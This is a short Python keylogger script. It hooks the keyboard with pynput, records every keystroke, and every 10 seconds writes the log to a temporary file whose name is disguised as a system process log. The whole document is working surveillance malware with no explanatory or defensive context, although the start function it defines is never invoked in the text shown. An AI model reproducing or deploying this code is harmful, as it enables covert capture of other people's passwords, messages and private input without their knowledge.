#!/usr/bin/python
import pynput.keyboard
import threading
import os

log = ""
path = "/tmp/systemprocess-9261468.log"
# try:
#     os.system("touch " + path)
# except:
#     pass
def process_keys(key):
    global log
    try:
        log = log + str(key.char)
    except AttributeError:
        if key == key.space:
            log = log + " "
        elif key == key.right:
            log = log + ""
        elif key == key.left:
            log = log + ""
        elif key == key.up:
            log = log + ""
        elif key == key.down:
            log = log + ""
        else:
            log = log + " " + str(key) + " "

def report():
    global log
    global path
    with open(path,"a") as fin:
        fin.write(log)
        log = ""
        fin.close()
        timer = threading.Timer(10, report)
        timer.start()

def start():
    keyboard_listener = pynput.keyboard.Listener(on_press=process_keys)
    with keyboard_listener:
        report()
        keyboard_listener.join()

